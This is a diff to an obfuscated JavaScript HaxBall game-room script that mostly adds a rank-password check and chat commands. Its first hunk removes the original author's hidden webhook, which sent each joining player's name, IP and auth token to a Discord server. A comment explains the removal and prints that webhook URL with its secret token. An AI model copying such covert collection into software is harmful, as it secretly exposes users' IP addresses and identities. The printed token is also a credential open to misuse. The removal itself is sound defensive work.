@@ -18139,7 +18139,11 @@ function sendIPToDiscord(player){const success=queueIPMessage(player);if(!succes
 console.log("✅ Sistema de rate-limit para Discord INICIADO");console.log(`   - Máximo en cola: ${MAX_QUEUE_LENGTH} mensajes`);console.log(`   - Delay entre mensajes: ${WEBHOOK_DELAY}ms`);console.log(`   - Webhooks protegidos: Boletero, IP-Jugadores`);var salaCerrada=!1;function verificarReserva(){const jugadores=room.getPlayerList().filter(p=>p.id!==0);const admins=jugadores.filter(p=>esAdminValido(p)).length;const noAdmins=jugadores.length-admins;const maxNoAdmins=maxPlayers-LugaresReservados;if(noAdmins>=maxNoAdmins&&!salaCerrada){room.setPassword(contrasena);room.sendAnnouncement(`🔒 Sala cerrada. Se reservan ${LugaresReservados} lugares para admins.`,null,0xFF0000,"bold",2);salaCerrada=!0}else if(noAdmins<maxNoAdmins&&salaCerrada){room.setPassword(null);room.sendAnnouncement("🔓 Sala abierta. Hay lugares disponibles.",null,0x00FF00,"bold",2);salaCerrada=!1}}
 var redData=parseColors(camisetaRed);var blueData=parseColors(camisetaBlue);var redAngle=redData.angle;var blueAngle=blueData.angle;var redTextColor=redData.textColor;var blueTextColor=blueData.textColor;var redColor=redData.colors;var blueColor=blueData.colors;room.setTeamColors(1,redAngle,redTextColor,redColor);room.setTeamColors(2,blueAngle,blueTextColor,blueColor);teamRed=NombreEquipoRojo
 teamBlue=NombreEquipoAzul
-setDefaultStadium();room.setScoreLimit(LimiteDeGoles);let adminMessageCooldown=!1;const ADMIN_MESSAGE_COOLDOWN=10000;room[_0x3c81f9(0x1a8)](TiempoDeJuego),room[_0x3c81f9(0x1cb)]=function(_0xde760){var _0x56cb2d=_0x3c81f9;roomLink=_0xde760,console[_0x56cb2d(0x136)](roomLink)},room[_0x3c81f9(0x1bc)]=function(_0x1dd3ba,_0x5b2bac){var _0x2c1a33=_0x3c81f9;_0x5b2bac!=null?map=_0x2c1a33(0x1b7):map=_0x2c1a33(0x1ca)},setInterval(function(_0x1b3d6f,_0x551b76){var _0xd1b3a4=_0x3c81f9;room[_0xd1b3a4(0x1d2)](_0xd1b3a4(0x1ab),_0x1b3d6f.id,0xffda82,_0xd1b3a4(0x1d6),0x2),room[_0xd1b3a4(0x1d2)](_0xd1b3a4(0x180),_0x1b3d6f.id,0xffda82,_0xd1b3a4(0x1d6),0x0)},0x927c0);var webhookID=_0x3c81f9(0x1b8);room[_0x3c81f9(0x12f)]=function(_0x4a7fbc){var _0x9060eb=_0x3c81f9,_0x436097={};_0x436097[_0x9060eb(0x1b1)]='**'+_0x4a7fbc[_0x9060eb(0x161)]+' -** ['+_0x4a7fbc[_0x9060eb(0x1c1)]+_0x9060eb(0x155)+_0x4a7fbc[_0x9060eb(0x1cd)]+']',_0x436097.username='Real Soccer Revolution';var _0x275f9e={};_0x275f9e['Content-Type']=_0x9060eb(0x130);var _0x338ced={};_0x338ced.method=_0x9060eb(0x175),_0x338ced[_0x9060eb(0x1b2)]=JSON[_0x9060eb(0x141)](_0x436097),_0x338ced[_0x9060eb(0x1bf)]=_0x275f9e,fetch(webhookID,_0x338ced)['then'](_0x169fd3=>_0x169fd3),whisper(_0x9060eb(0x131),_0x4a7fbc.id,0x61b3ff,_0x9060eb(0x17a),0x0),whisper(_0x9060eb(0x137),_0x4a7fbc.id,0x61c5ff,'bold',0x0),whisper(_0x9060eb(0x1a4),_0x4a7fbc.id,0x61cdff,_0x9060eb(0x17a),0x0),whisper(_0x9060eb(0x1c5),_0x4a7fbc.id,0x61ddff,_0x9060eb(0x17a),0x0),whisper(_0x9060eb(0x151),_0x4a7fbc.id,0x61e7ff,_0x9060eb(0x17a),0x0),displayAdminMessage()},room.onPlayerLeave=function(player){delete playerJoinTimes[player.id];connections=connections.filter(conn=>conn[0]!==player.id);const now=Date.now();if(now-leaveFlood.lastReset>LEAVE_FLOOD_WINDOW){leaveFlood.count=0;leaveFlood.lastReset=now}
+setDefaultStadium();room.setScoreLimit(LimiteDeGoles);let adminMessageCooldown=!1;const ADMIN_MESSAGE_COOLDOWN=10000;room[_0x3c81f9(0x1a8)](TiempoDeJuego),room[_0x3c81f9(0x1cb)]=function(_0xde760){var _0x56cb2d=_0x3c81f9;roomLink=_0xde760,console[_0x56cb2d(0x136)](roomLink)},room[_0x3c81f9(0x1bc)]=function(_0x1dd3ba,_0x5b2bac){var _0x2c1a33=_0x3c81f9;_0x5b2bac!=null?map=_0x2c1a33(0x1b7):map=_0x2c1a33(0x1ca)},setInterval(function(_0x1b3d6f,_0x551b76){var _0xd1b3a4=_0x3c81f9;room[_0xd1b3a4(0x1d2)](_0xd1b3a4(0x1ab),_0x1b3d6f.id,0xffda82,_0xd1b3a4(0x1d6),0x2),room[_0xd1b3a4(0x1d2)](_0xd1b3a4(0x180),_0x1b3d6f.id,0xffda82,_0xd1b3a4(0x1d6),0x0)},0x927c0);/* ⚠️ WEBHOOK OCULTO DEL AUTOR — DESACTIVADO POR ÑANDUTÍBALL
+   Enviaba el nombre, la IP (player.conn) y el auth de cada jugador que entraba a:
+   https://discord.com/api/webhooks/816061374504763402/Us5kMMIjcwUHylZ7-SBGnH2wkODNDHi24wvPk85wj6XecLB754wIHe-iEM776Sfk9_-Y
+   Ese Discord no es nuestro. No volver a activarlo. */
+var webhookID=null;room[_0x3c81f9(0x12f)]=function(_0x4a7fbc){var _0x9060eb=_0x3c81f9,_0x436097={};_0x436097[_0x9060eb(0x1b1)]='**'+_0x4a7fbc[_0x9060eb(0x161)]+' -** ['+_0x4a7fbc[_0x9060eb(0x1c1)]+_0x9060eb(0x155)+_0x4a7fbc[_0x9060eb(0x1cd)]+']',_0x436097.username='Real Soccer Revolution';var _0x275f9e={};_0x275f9e['Content-Type']=_0x9060eb(0x130);var _0x338ced={};_0x338ced.method=_0x9060eb(0x175),_0x338ced[_0x9060eb(0x1b2)]=JSON[_0x9060eb(0x141)](_0x436097),_0x338ced[_0x9060eb(0x1bf)]=_0x275f9e,/* envío al webhook oculto quitado */whisper(_0x9060eb(0x131),_0x4a7fbc.id,0x61b3ff,_0x9060eb(0x17a),0x0),whisper(_0x9060eb(0x137),_0x4a7fbc.id,0x61c5ff,'bold',0x0),whisper(_0x9060eb(0x1a4),_0x4a7fbc.id,0x61cdff,_0x9060eb(0x17a),0x0),whisper(_0x9060eb(0x1c5),_0x4a7fbc.id,0x61ddff,_0x9060eb(0x17a),0x0),whisper(_0x9060eb(0x151),_0x4a7fbc.id,0x61e7ff,_0x9060eb(0x17a),0x0),displayAdminMessage()},room.onPlayerLeave=function(player){delete playerJoinTimes[player.id];connections=connections.filter(conn=>conn[0]!==player.id);const now=Date.now();if(now-leaveFlood.lastReset>LEAVE_FLOOD_WINDOW){leaveFlood.count=0;leaveFlood.lastReset=now}
 leaveFlood.count++;const floodDetectado=leaveFlood.count>LEAVE_FLOOD_LIMIT;if(player.conn&&typeof player.conn==="string"){const playerIp=decryptHex(player.conn);const sameIpConnections=connections.filter(conn=>{const connIp=decryptHex(conn[1]);return connIp===playerIp});if(sameIpConnections.length===0){UsedNames=UsedNames.filter(nameRecord=>{const nameRecordIp=decryptHex(nameRecord.conn);return nameRecordIp!==playerIp});const playersWithSameIp=room.getPlayerList().filter(p=>{if(p.conn&&typeof p.conn==="string"){const pIp=decryptHex(p.conn);return pIp===playerIp}
 return!1});if(playersWithSameIp.length===0){delete usedUsernames[player.name]}}}else{console.log(`player.conn indefinido para ${player.name} en onPlayerLeave`)}
 if(automatizadoActivado){const jugadores=room.getPlayerList();const jugadoresNoAFK=jugadores.filter(p=>!afkPlayerIDs.has(p.id));const numJugadores=jugadoresNoAFK.length;modoJueganAlgunos=!0;var nuevaConfiguracion=null;if(numJugadores===1){maxPlayersPerTeam=1;nuevaConfiguracion={mapa:getEntrenamientoFutsalMap(),scoreLimit:GolesEntrenamientoFutsal,timeLimit:TiempoEntrenamientoFutsal}}else if(numJugadores>1&&numJugadores<=3){maxPlayersPerTeam=1;nuevaConfiguracion={mapa:getFutx2Map(),scoreLimit:GolesFutsalx2,timeLimit:TiempoFutsalx2}}else if(numJugadores>=4&&numJugadores<=5){maxPlayersPerTeam=2;nuevaConfiguracion={mapa:getFutx2Map(),scoreLimit:GolesFutsalx2,timeLimit:TiempoFutsalx2}}else if(numJugadores>=6&&numJugadores<=7){maxPlayersPerTeam=3;nuevaConfiguracion={mapa:getFutx3Map(),scoreLimit:GolesFutsalx3,timeLimit:TiempoFutsalx3}}else if(numJugadores>=8&&numJugadores<=9){maxPlayersPerTeam=4;nuevaConfiguracion={mapa:getFutx4Map(),scoreLimit:GolesFutsalx3,timeLimit:TiempoFutsalx3}}else if(numJugadores>=10&&numJugadores<=11){maxPlayersPerTeam=5;nuevaConfiguracion={mapa:getFutx5Map(),scoreLimit:GolesFutsalx5,timeLimit:TiempoFutsalx5}}else if(numJugadores>=14){maxPlayersPerTeam=7;nuevaConfiguracion={mapa:getFutx7Map(),scoreLimit:GolesFutsalx7,timeLimit:TiempoFutsalx7}}
@@ -18287,4 +18291,315 @@ function unmuteFun(player,message){if(player.admin===!0){const spacePos=message.
 const targetPlayer=room.getPlayer(targetPlayerId);if(targetPlayer){delete mutedPlayers[targetPlayer.name];var announcement="🔊 "+targetPlayer.name+" ha sido DESMUTEADO 🔓 por "+player.name+" 🔊";room.sendAnnouncement(announcement,null,0x00FF00,"bold",0)}}}
 var isRoomMuted=!1;function UnmuteAll(player,message){if(player.admin==!0){isRoomMuted=!1;mutedPlayers=[];room.sendAnnouncement("📣 "+player.name+" ha desmuteado a todos los jugadores. 🗣️🔓",null,0x32cd32,"bold",0)}}
 function EspecialesFun(player){room.sendAnnouncement('⎝༽  | ︻╦̵̵╤── | ඞ |  ⊹ | ✧ | ✦ | ツ | ♬ | ᕦ( ͡° ͜ʖ ͡°)ᕤ | 乡 | 『』 | 卍 | 〘〙| ༒ |  ௵ | 々| 𒆜 | 𒐫 | 𒈞',player.id,0xFF003C,"normal",0)}
-function NumeroUnoFun(player){room.sendAnnouncement('🔢  𝟭         ౹         𝟏          𝟷          𝟣         １         ߗ1𐰯¹₁⥠↿˥⒈         𝟏        𝟷𐰯 І        Ι         Ӏ        ᅵ        𝗹        ।         ⅂       
+
+
+// ▇▇▇▇▇▇▇▇▇ 🎖️ RANGOS CON CLAVE — ÑandutíBall ▇▇▇▇▇▇▇▇▇
+// Los jugadores con rango (OWNER, CO-OWNER, ...) tienen que escribir la clave para poder jugar.
+// Mientras no la escriban quedan como espectadores y en AFK. El resto de la gente entra normal.
+// Los rangos y la clave salen de roles.json (se editan desde el panel, sin reiniciar la sala).
+
+var RANGOS = window.__RANGOS || { clave: "", roles: [] };
+var rangosVerificados = {};   // id del jugador -> true cuando ya puso la clave
+
+// El panel avisa por acá cuando se cambian los rangos
+window.__rangosActualizar = function (datos) {
+	RANGOS = datos || { clave: "", roles: [] };
+	console.log("🎖️ Rangos actualizados: " + RANGOS.roles.length + " roles");
+};
+
+function rangoDelNombre(nombre) {
+	for (var i = 0; i < RANGOS.roles.length; i++) {
+		var rol = RANGOS.roles[i];
+		for (var j = 0; j < rol.nicks.length; j++) {
+			if (rol.nicks[j].toLowerCase() === String(nombre).toLowerCase()) return rol;
+		}
+	}
+	return null;
+}
+
+function tieneRangoSinVerificar(player) {
+	return Boolean(rangoDelNombre(player.name)) && !rangosVerificados[player.id];
+}
+
+function pedirClave(player) {
+	var rol = rangoDelNombre(player.name);
+	room.sendAnnouncement("🎖️ Detectamos tu rango: " + rol.nombre, player.id, 0xFFD100, "bold", 2);
+	room.sendAnnouncement("🔐 Escribí la clave en el chat y dale Enter para poder jugar.", player.id, 0xFFD100, "bold", 0);
+	room.sendAnnouncement("💤 Mientras tanto quedás como espectador y en AFK.", player.id, 0x93A1B0, "small", 0);
+	afkPlayerIDs.add(player.id);
+	if (player.team !== 0) room.setPlayerTeam(player.id, 0);
+}
+
+function verificarRango(player) {
+	var rol = rangoDelNombre(player.name);
+	rangosVerificados[player.id] = true;
+	afkPlayerIDs.delete(player.id);
+	if (rol && rol.admin) room.setPlayerAdmin(player.id, true);
+	room.sendAnnouncement("✅ Clave correcta. ¡Bienvenido, " + rol.nombre + " " + player.name + "!", null, 0x2ECC71, "bold", 2);
+}
+
+// Al entrar: si tiene rango, le pedimos la clave (sin pisar lo que ya hacía el script)
+(function () {
+	var anteriorJoin = room.onPlayerJoin;
+	room.onPlayerJoin = function (player) {
+		if (typeof anteriorJoin === "function") anteriorJoin(player);
+		if (rangoDelNombre(player.name)) setTimeout(function () { pedirClave(player); }, 1500);
+	};
+
+	var anteriorLeave = room.onPlayerLeave;
+	room.onPlayerLeave = function (player) {
+		if (typeof anteriorLeave === "function") anteriorLeave(player);
+		delete rangosVerificados[player.id];
+	};
+
+	// Si todavía no puso la clave, no puede entrar a la cancha
+	var anteriorTeam = room.onPlayerTeamChange;
+	room.onPlayerTeamChange = function (player, porQuien) {
+		if (typeof anteriorTeam === "function") anteriorTeam(player, porQuien);
+		if (player.team !== 0 && tieneRangoSinVerificar(player)) {
+			room.setPlayerTeam(player.id, 0);
+			room.sendAnnouncement("🔐 Primero escribí la clave de tu rango para poder jugar.", player.id, 0xFF4444, "bold", 2);
+		}
+	};
+})();
+
+
+// ▇▇▇▇▇▇▇▇▇ 💬 COMANDOS DEL CHAT — repuestos por ÑandutíBall ▇▇▇▇▇▇▇▇▇
+// El script original venía cortado y sin room.onPlayerChat, así que NINGÚN comando funcionaba.
+// Este bloque vuelve a conectar los comandos con las funciones que ya existen más arriba.
+// Los comandos que dependen de funciones que faltaban en el archivo (estadísticas, votaciones,
+// !size, !avatar) no están: avisan que no están disponibles.
+
+var MapasPorComando = {
+	"!rs": getRealSoccerMap2,
+	"!rs2": getRealSoccerMap,
+	"!rsevo": getRealSoccerMap4,
+	"!rsoveja": getRealSoccerMapOveja,
+	"!minirs": getMiniRSMap,
+	"!entrenamiento": getEntrenamientoRealSoccer,
+	"!realfutsal": getRealFutsal,
+	"!entrenamientofutsal": getEntrenamientoFutsalMap,
+	"!futx2": getFutx2Map,
+	"!futx3": getFutx3Map,
+	"!futx4": getFutx4Map,
+	"!futx5": getFutx5Map,
+	"!futx5cesped": getFutx5cespedMap,
+	"!futx7": getFutx7Map,
+	"!pensred": getPenaltyRedMap,
+	"!pensblue": getPenaltyBlueMap,
+	"!basket": getBasquetMap,
+	"!handball": getHandballMap,
+	"!voley2d": getVoley2DMap,
+	"!voley3d": getVoley3DMap,
+	"!tenis-ladrillo": getTenisLadrilloMap,
+	"!tenis-pasto": getTenisPastoMap,
+	"!tenis-cemento": getTenisCementoMap,
+	"!sk8": getSkateMap,
+	"!escuela": getEscuelaMap,
+	"!big": getBigMap,
+	"!campeones": getCampeonesMap,
+	"!premios": getPremiosMap,
+	"!2man": get2Man,
+	"!3man": get3Man,
+	"!4man": get4Man,
+	"!5man": get5Man,
+	"!6man": get6Man,
+	"!7man": get7Man,
+	"!8man": get8Man
+};
+
+// Comandos que necesitaban funciones que no están en este archivo
+var ComandosFaltantes = ["!me", "!stats", "!goleadores", "!asistidores", "!vallas-invictas", "!mvp",
+	"!racha-historica", "!racha-actual", "!viciosos", "!ganadores", "!presencias", "!memide",
+	"!avatar", "!size", "!expulsar", "!admin", "!llamaradmins", "!votarmapa", "!ofi", "!firmar"];
+
+function avisar(player, texto, color, estilo) {
+	room.sendAnnouncement(texto, player.id, color || 0xFFD100, estilo || "normal", 0);
+}
+
+function esSoloAdmin(player) {
+	if (player.admin) return true;
+	avisar(player, "🔐 Ese comando es solo para administradores.", 0xFF4444, "bold");
+	return false;
+}
+
+function jugadorSilenciado(player) {
+	var datos = mutedPlayers[player.name];
+	if (!datos) return false;
+	if (datos.muteTime !== Infinity && Date.now() > datos.muteTime) {
+		delete mutedPlayers[player.name];
+		return false;
+	}
+	avisar(player, "🔇 Estás silenciado, no podés escribir en el chat.", 0xFF4444, "bold");
+	return true;
+}
+
+// Prefijo y color según el rango de roles.json, el rol del script o el equipo
+function adornoDelJugador(player) {
+	var rango = typeof rangoDelNombre === "function" ? rangoDelNombre(player.name) : null;
+	if (rango) return { prefijo: rango.nombre + " ", color: ColorDelChatROL1, estilo: "bold", sonido: 2 };
+
+	var listas = [NickNamesRol1, NickNamesRol2, NickNamesRol3, NickNamesRol4, NickNamesRol5,
+		NickNamesRol6, NickNamesRol7, NickNamesRol8, NickNamesRol9, NickNamesRol10];
+	var nombres = [NombreROL1, NombreROL2, NombreROL3, NombreROL4, NombreROL5,
+		NombreROL6, NombreROL7, NombreROL8, NombreROL9, NombreROL10];
+	var colores = [ColorDelChatROL1, ColorDelChatROL2, ColorDelChatROL3, ColorDelChatROL4, ColorDelChatROL5,
+		ColorDelChatROL6, ColorDelChatROL7, ColorDelChatROL8, ColorDelChatROL9, ColorDelChatROL10];
+
+	for (var i = 0; i < listas.length; i++) {
+		if (listas[i] && listas[i].indexOf(player.name) !== -1) {
+			var atributos = RoleAttributes[nombres[i]] || { style: "normal", sound: 1 };
+			return { prefijo: nombres[i] + " ", color: colores[i], estilo: atributos.style, sonido: atributos.sound };
+		}
+	}
+	if (player.admin) return { prefijo: NombreROLAdmin + " ", color: adminChatColor, estilo: "normal", sonido: 1 };
+	if (player.team === 1) return { prefijo: NombreROLRed + " ", color: RedChatColor, estilo: "normal", sonido: 1 };
+	if (player.team === 2) return { prefijo: NombreROLBlue + " ", color: BlueChatColor, estilo: "normal", sonido: 1 };
+	return { prefijo: NombreROLSpect + " ", color: SpectChatColor, estilo: "normal", sonido: 1 };
+}
+
+function chatDeEquipo(player, texto) {
+	var color = player.team === 1 ? RedTeamChatColor : BlueTeamChatColor;
+	room.getPlayerList().forEach(function (otro) {
+		if (otro.team === player.team) {
+			room.sendAnnouncement("[EQUIPO] " + player.name + ": " + texto, otro.id, color, "small-bold", 0);
+		}
+	});
+}
+
+function sacarATodos(player) {
+	room.getPlayerList().forEach(function (jugador) {
+		if (jugador.id !== 0) room.setPlayerTeam(jugador.id, 0);
+	});
+	room.sendAnnouncement("👥 " + player.name + " mandó a todos a espectadores.", null, 0x00FFBB, "bold", 0);
+}
+
+function listarCamisetas(player) {
+	var vistos = [];
+	for (var clave in camisetasEquipos) {
+		var nombre = camisetasEquipos[clave].nombreEquipo;
+		if (vistos.indexOf(nombre) === -1) vistos.push(nombre);
+	}
+	avisar(player, "👕 CAMISETAS DISPONIBLES (" + vistos.length + "):", 0xFFD100, "bold");
+	avisar(player, vistos.join(" · "), 0xFFFFFF, "small");
+}
+
+function silenciarJugador(player, message) {
+	var partes = message.split(" ");
+	var id = parseInt(partes[1], 10);
+	var minutos = partes[2] ? parseInt(partes[2], 10) : Infinity;
+	if (isNaN(id)) {
+		avisar(player, "Uso: !mute ID [minutos]  (escribí # para ver los IDs)", 0xFF4444, "bold");
+		return;
+	}
+	pushMute(id, minutos, player.name);
+}
+
+room.onPlayerChat = function (player, message) {
+	var texto = message.trim();
+
+	if (jugadorSilenciado(player)) return false;
+
+	// Clave del rango: el que tiene rango no juega hasta escribirla
+	if (typeof tieneRangoSinVerificar === "function" && tieneRangoSinVerificar(player)) {
+		if (RANGOS.clave && texto === RANGOS.clave) {
+			verificarRango(player);
+		} else {
+			avisar(player, "🔐 Escribí la clave de tu rango para poder jugar.", 0xFF4444, "bold");
+		}
+		return false;
+	}
+
+	// Clave para hacerse administrador
+	if (texto === ClaveParaSerAdmin) {
+		room.setPlayerAdmin(player.id, true);
+		room.sendAnnouncement("👑 " + player.name + " ahora es administrador.", null, 0xFFD100, "bold", 2);
+		return false;
+	}
+
+	// Chat de equipo:  t mensaje
+	if (/^t /i.test(texto) && player.team !== 0) {
+		chatDeEquipo(player, texto.slice(2));
+		return false;
+	}
+
+	// Mensaje privado:  !pm ID mensaje
+	if (texto.startsWith("!pm ")) {
+		pmFun(player, texto);
+		return false;
+	}
+
+	// Lista de jugadores con sus IDs
+	if (texto === "#") {
+		ListaDeJugadoresFun(player);
+		return false;
+	}
+
+	if (texto.charAt(0) !== "!") {
+		// Mensaje normal: lo mostramos con el prefijo del rol
+		var adorno = adornoDelJugador(player);
+		room.sendAnnouncement(adorno.prefijo + player.name + ": " + texto, null, adorno.color, adorno.estilo, adorno.sonido);
+		return false;
+	}
+
+	var comando = texto.split(" ")[0].toLowerCase();
+
+	// ── Mapas (solo admins) ──
+	if (MapasPorComando[comando]) {
+		if (!esSoloAdmin(player)) return false;
+		room.stopGame();
+		room.setCustomStadium(MapasPorComando[comando]());
+		room.sendAnnouncement("🗺️ Mapa cambiado a " + getMapName(comando) + " por " + player.name, null, 0x00FFBB, "bold", 2);
+		return false;
+	}
+
+	switch (comando) {
+		// ── Todos ──
+		case "!help": helpFun(player); break;
+		case "!mapas": MapasFun(player); break;
+		case "!camisetas": listarCamisetas(player); break;
+		case "!afk": afkFun(player, texto); break;
+		case "!afks": afksFun(player, texto); break;
+		case "!posesion": PosesionBalonFun(player, texto); break;
+		case "!posesionequipos": teamPossFun(player, texto); break;
+		case "!reglas": ReglasFun(player); break;
+		case "!reglamento": ReglamentoFun(player); break;
+		case "!fixture": FixtureFun(player); break;
+		case "!resultados": ResultadosFun(player); break;
+		case "!tenis": TenisFun(player); break;
+		case "!especiales": EspecialesFun(player); break;
+		case "!tutorial": TutorialFun(player); break;
+		case "!discord":
+			avisar(player, DiscordLink ? "🔗 Discord: " + DiscordLink : "🕸️ ÑandutíBall — el host paraguayo de HaxBall, hecho por Jinder");
+			break;
+		case "!nv": case "!adormir": case "!acomer": leaveFun(player, comando); break;
+
+		// ── Administradores ──
+		case "!adminhelp": if (esSoloAdmin(player)) adminHelpFun(player); break;
+		case "!rr": if (esSoloAdmin(player)) resetFun(player); break;
+		case "!swap": if (esSoloAdmin(player)) swapFun(player); break;
+		case "!bb": if (esSoloAdmin(player)) sacarATodos(player); break;
+		case "!clearbans": if (esSoloAdmin(player)) clearbansFun(player); break;
+		case "!kickafks": if (esSoloAdmin(player)) kickafksFun(player, texto); break;
+		case "!set_password": if (esSoloAdmin(player)) setpasswordFun(player, texto); break;
+		case "!clear_password": if (esSoloAdmin(player)) clearpasswordFun(player, texto); break;
+		case "!banip": if (esSoloAdmin(player)) BanIpFun(player, texto); break;
+		case "!unbanip": if (esSoloAdmin(player)) unBanIpFun(player, texto); break;
+		case "!unbanallips": if (esSoloAdmin(player)) unBanAllIpsFun(player, texto); break;
+		case "!mute": if (esSoloAdmin(player)) silenciarJugador(player, texto); break;
+		case "!unmute": if (esSoloAdmin(player)) unmuteFun(player, texto); break;
+		case "!unmuteall": if (esSoloAdmin(player)) UnmuteAll(player, texto); break;
+		case "!clubcolors": if (esSoloAdmin(player)) toggleSwapColors(); break;
+		case "!swapcolors": if (esSoloAdmin(player)) swapTeamColors(); break;
+
+		default:
+			if (ComandosFaltantes.indexOf(comando) !== -1) {
+				avisar(player, "⚠️ " + comando + " no está disponible en esta versión del script.", 0xFF8800, "bold");
+			} else {
+				avisar(player, "❓ No conozco el comando " + comando + ". Escribí !help para ver la lista.", 0xFF4444, "bold");
+			}
+	}
+	return false;
+};
+
+console.log("💬 Comandos del chat activos");
